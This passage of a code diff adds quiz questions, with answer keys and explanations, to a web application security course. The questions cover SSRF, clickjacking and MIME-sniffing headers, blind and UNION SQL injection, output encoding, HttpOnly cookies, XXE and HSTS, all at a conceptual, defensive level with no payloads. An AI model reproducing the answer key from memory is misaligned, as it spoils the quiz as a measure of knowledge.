+                        QuizQuestion(id="w1_6", text="SSRF attacks abuse the server to make requests to:", options=["Only external sites", "Internal/private network resources", "Only HTTPS sites", "Only DNS servers"], correct_answer=1, explanation="SSRF (Server-Side Request Forgery) tricks the server into making requests to internal services (metadata endpoints, internal APIs, localhost)."),
+                        QuizQuestion(id="w1_7", text="What is the purpose of the X-Frame-Options: DENY header?", options=["Prevent clickjacking", "Enable frame embedding", "Compress frames", "Cache frames"], correct_answer=0, explanation="X-Frame-Options: DENY prevents the page from being embedded in frames/iframes, protecting against clickjacking attacks."),
+                        QuizQuestion(id="w1_8", text="Which HTTP security header prevents MIME-type sniffing?", options=["X-XSS-Protection", "X-Content-Type-Options", "Content-Security-Policy", "Referrer-Policy"], correct_answer=1, explanation="X-Content-Type-Options: nosniff prevents browsers from MIME-sniffing responses away from the declared content-type."),
+                        QuizQuestion(id="w1_9", text="A successful blind SQLi attack relies on:", options=["Direct error messages", "Observing application behavior differences", "Fast response times", "Visible database output"], correct_answer=1, explanation="Blind SQLi infers information by observing differences in application behavior (true/false responses, time delays) without seeing direct output."),
+                        QuizQuestion(id="w1_10", text="What is the safest way to handle user input displayed in HTML?", options=["Remove all special characters", "Context-aware output encoding", "URL encoding only", "Base64 encoding"], correct_answer=1, explanation="Context-aware encoding (HTML entity encoding for HTML context, JS encoding for script context, URL encoding for URL context) is the correct defense."),
+                        QuizQuestion(id="w1_11", text="In a UNION-based SQLi attack, what must match between queries?", options=["Only table names", "Number of columns and compatible data types", "Only database names", "Only WHERE clauses"], correct_answer=1, explanation="UNION requires both SELECT statements to return the same number of columns with compatible data types."),
+                        QuizQuestion(id="w1_12", text="The HttpOnly cookie flag prevents:", options=["Cookie theft via JavaScript (XSS)", "CSRF attacks", "Session hijacking via network sniffing", "Cookie expiration"], correct_answer=0, explanation="HttpOnly prevents JavaScript from accessing the cookie via document.cookie, protecting against XSS-based cookie theft."),
+                        QuizQuestion(id="w1_13", text="What is XXE (XML External Entity) injection?", options=["A type of XSS", "Parsing XML with malicious external entity declarations", "A SQL injection variant", "A network protocol attack"], correct_answer=1, explanation="XXE exploits XML parsers that process external entity declarations, allowing file reading, SSRF, and DoS attacks."),
+                        QuizQuestion(id="w1_14", text="Which approach is most effective for preventing SSRF?", options=["URL blacklisting", "Network segmentation + URL validation", "Longer timeouts", "More RAM"], correct_answer=1, explanation="Network segmentation (blocking internal network access from app servers) combined with strict URL validation is the most effective SSRF defense."),
+                        QuizQuestion(id="w1_15", text="What does HSTS (HTTP Strict Transport Security) enforce?", options=["HTTPS-only connections", "Strong password requirements", "Two-factor authentication", "Content encryption"], correct_answer=0, explanation="HSTS (Strict-Transport-Security header) forces browsers to always use HTTPS for the domain, preventing downgrade attacks."),
+                    ]
+                )
+            ),
+        ]
+    )
+    _courses_db["webapp_sec_001"] = course2
